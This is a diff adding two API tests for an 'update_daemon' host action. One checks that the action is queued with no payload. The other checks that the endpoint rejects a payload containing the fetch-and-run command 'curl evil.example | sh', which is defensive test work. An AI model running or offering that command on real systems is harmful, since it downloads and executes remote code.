@@ -98,6 +98,26 @@ describe("POST /api/v1/hosts/:hostId/actions — enqueue", () => {
     });
     expect(res.status).toBe(404);
   });
+
+  test("LAMA-299: enqueues update_daemon with no payload", async () => {
+    const res = await postJson("/api/v1/hosts/host-a/actions", {
+      type: "update_daemon",
+    });
+    expect(res.status).toBe(201);
+    const body = (await res.json()) as Record<string, unknown>;
+    expect(body.type).toBe("update_daemon");
+    expect(body.payload).toBeNull();
+  });
+
+  test("LAMA-299: update_daemon rejects a caller-provided payload", async () => {
+    // A payload would be remote code execution by another name — the
+    // daemon targets the release proxy on its own.
+    const res = await postJson("/api/v1/hosts/host-a/actions", {
+      type: "update_daemon",
+      payload: { argv: "curl evil.example | sh" },
+    });
+    expect(res.status).toBe(400);
+  });
 });
 
 describe("GET /api/v1/actions/pending — daemon take", () => {
